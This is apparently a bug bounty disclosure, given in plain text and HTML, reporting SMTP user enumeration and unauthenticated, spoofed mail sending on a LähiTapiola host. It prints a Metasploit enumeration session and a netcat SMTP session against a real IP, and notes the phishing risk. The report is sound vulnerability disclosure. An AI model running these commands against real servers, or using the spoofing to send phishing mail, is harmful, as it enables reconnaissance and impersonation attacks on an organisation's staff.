    "vulnerability_information": "Hello guys,\n\nI have two related SMTP vulnerabilities. I decided to put both of them under the same ticket because they are closely related.\n\n**Summary:**\nI discovered two SMTP vulnerabilities on host viestinta.lahitapiola.fi. First it is possible to perform user enumeration. For this you can use metasploit in following way:\n\n`msf > use auxiliary/scanner/smtp/smtp_enum\nmsf auxiliary(smtp_enum) > set RHOSTS 83.150.127.170\nRHOSTS => 83.150.127.170\nmsf auxiliary(smtp_enum) > run\n[*] 83.150.127.170:25 Banner: 220 viestinta.tapiola.fi ESMTP Postfix\n[+] 83.150.127.170:25 Users found: , adm, bin, daemon, fax, ftp, games, gdm, gopher, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed`\n\nWith this step we recovered valid users on the system (please note I used the default dictionary which comes with metasploit, I did not attempt to create wordlist which would discover your personal email addresses, to limit number of brute force guesses).\n\nSecond vulnerability is the fact an attacker without any authentication can send emails from this SMTP. Email are limited to \"@viestinta.lahitapiola.fi\" only. To reproduce you can use NetCat utility:\n\n`root@kali:~/Android/Sdk/tools# nc -nvv 83.150.127.170 25\n(UNKNOWN) [83.150.127.170] 25 (smtp) open\n220 viestinta.tapiola.fi ESMTP Postfix\nHELO 83.150.127.170\n250 viestinta.tapiola.fi\nMAIL FROM:<hacker@viestinta.tapiola.fi>\n250 2.1.0 Ok\nRCPT TO:<hacker@viestinta.tapiola.fi>\n550 5.1.1 <hacker@viestinta.tapiola.fi>: Recipient address rejected: User unknown in local recipient table\nRCPT TO:<admin@viestinta.tapiola.fi>\n550 5.1.1 <admin@viestinta.tapiola.fi>: Recipient address rejected: User unknown in local recipient table\nRCPT TO:<adm@viestinta.tapiola.fi>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\ntest\n.\n250 2.0.0 Ok: queued as 98F9E3F201A1\n421 4.4.2 viestinta.tapiola.fi Error: timeout exceeded\n sent 211, rcvd 481`\n\nIn NetCat session above you can see I used fake email address hacker@viestinta.tapiola.fi to send email to adm@viestinta.tapiola.fi (we discovered this is valid target in step one - user enumeration). You can see the difference when I tried to send an email to address which does not exist \"<hacker@viestinta.tapiola.fi>: Recipient address rejected: User unknown in local recipient table\".\n\nFrom my point of view there are a few problems:\n1. Information leakage (in step one attacker can get valid system accounts/emails). Those details can be used during later phase of attack (probably low impact)\n2. An attacker could use this to spam internal users, maybe DoS (low risk)\n3. An attacker could use this to launch very efficient phishing campaign. As I already stated it is possible to send email from any address, so attacker could pick something trusted like administrator@ or it-support@ , etc. Then there is a higher chance unsuspecting employee would click malicious URL/executable in the email (probably medium risk)\n\n\n**Domain:** viestinta.tapiola.fi\n\n## Browsers / Apps Verified In: n/a - infrastruture problem\n\n## Steps To Reproduce: Provided in summary section.\n\n## Related reports, best practices\n\nhttps://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/ - about SMTP user enumeration",

    "vulnerability_information_html": "<p>Hello guys,</p>\n\n<p>I have two related SMTP vulnerabilities. I decided to put both of them under the same ticket because they are closely related.</p>\n\n<p><strong>Summary:</strong><br>\nI discovered two SMTP vulnerabilities on host viestinta.lahitapiola.fi. First it is possible to perform user enumeration. For this you can use metasploit in following way:</p>\n\n<p><code>msf &gt; use auxiliary/scanner/smtp/smtp_enum<br>\nmsf auxiliary(smtp_enum) &gt; set RHOSTS 83.150.127.170<br>\nRHOSTS =&gt; 83.150.127.170<br>\nmsf auxiliary(smtp_enum) &gt; run<br>\n[*] 83.150.127.170:25 Banner: 220 viestinta.tapiola.fi ESMTP Postfix<br>\n[+] 83.150.127.170:25 Users found: , adm, bin, daemon, fax, ftp, games, gdm, gopher, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www<br>\n[*] Scanned 1 of 1 hosts (100% complete)<br>\n[*] Auxiliary module execution completed</code></p>\n\n<p>With this step we recovered valid users on the system (please note I used the default dictionary which comes with metasploit, I did not attempt to create wordlist which would discover your personal email addresses, to limit number of brute force guesses).</p>\n\n<p>Second vulnerability is the fact an attacker without any authentication can send emails from this SMTP. Email are limited to &quot;@viestinta.lahitapiola.fi&quot; only. To reproduce you can use NetCat utility:</p>\n\n<p><code>root@kali:~/Android/Sdk/tools# nc -nvv 83.150.127.170 25<br>\n(UNKNOWN) [83.150.127.170] 25 (smtp) open<br>\n220 viestinta.tapiola.fi ESMTP Postfix<br>\nHELO 83.150.127.170<br>\n250 viestinta.tapiola.fi<br>\nMAIL FROM:&lt;hacker@viestinta.tapiola.fi&gt;<br>\n250 2.1.0 Ok<br>\nRCPT TO:&lt;hacker@viestinta.tapiola.fi&gt;<br>\n550 5.1.1 &lt;hacker@viestinta.tapiola.fi&gt;: Recipient address rejected: User unknown in local recipient table<br>\nRCPT TO:&lt;admin@viestinta.tapiola.fi&gt;<br>\n550 5.1.1 &lt;admin@viestinta.tapiola.fi&gt;: Recipient address rejected: User unknown in local recipient table<br>\nRCPT TO:&lt;adm@viestinta.tapiola.fi&gt;<br>\n250 2.1.5 Ok<br>\nDATA<br>\n354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br>\ntest<br>\n.<br>\n250 2.0.0 Ok: queued as 98F9E3F201A1<br>\n421 4.4.2 viestinta.tapiola.fi Error: timeout exceeded<br>\n sent 211, rcvd 481</code></p>\n\n<p>In NetCat session above you can see I used fake email address <a title=\"hacker@viestinta.tapiola.fi\" href=\"mailto:hacker@viestinta.tapiola.fi\" rel=\"nofollow noopener noreferrer\">hacker@viestinta.tapiola.fi</a> to send email to <a title=\"adm@viestinta.tapiola.fi\" href=\"mailto:adm@viestinta.tapiola.fi\" rel=\"nofollow noopener noreferrer\">adm@viestinta.tapiola.fi</a> (we discovered this is valid target in step one - user enumeration). You can see the difference when I tried to send an email to address which does not exist &quot;<a title=\"hacker@viestinta.tapiola.fi\" href=\"mailto:hacker@viestinta.tapiola.fi\" rel=\"nofollow noopener noreferrer\">hacker@viestinta.tapiola.fi</a>: Recipient address rejected: User unknown in local recipient table&quot;.</p>\n\n<p>From my point of view there are a few problems:</p>\n\n<ol>\n<li>Information leakage (in step one attacker can get valid system accounts/emails). Those details can be used during later phase of attack (probably low impact)</li>\n<li>An attacker could use this to spam internal users, maybe DoS (low risk)</li>\n<li>An attacker could use this to launch very efficient phishing campaign. As I already stated it is possible to send email from any address, so attacker could pick something trusted like administrator@ or it-support@ , etc. Then there is a higher chance unsuspecting employee would click malicious URL/executable in the email (probably medium risk)</li>\n</ol>\n\n<p><strong>Domain:</strong> viestinta.tapiola.fi</p>\n\n<h2 id=\"browsers-apps-verified-in-n-a-infrastruture-problem\">Browsers / Apps Verified In: n/a - infrastruture problem</h2>\n\n<h2 id=\"steps-to-reproduce-provided-in-summary-section\">Steps To Reproduce: Provided in summary section.</h2>\n\n<h2 id=\"related-reports-best-practices\">Related reports, best practices</h2>\n\n<p><a title=\"https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/\" href=\"/redirect?signature=5ea31af5c26b34dbb413fd208d2179d7569bef25&amp;url=https%3A%2F%2Fpentestlab.wordpress.com%2F2012%2F11%2F20%2Fsmtp-user-enumeration%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/</span><i class=\"icon-external-link\"></i></a> - about SMTP user enumeration</p>\n",
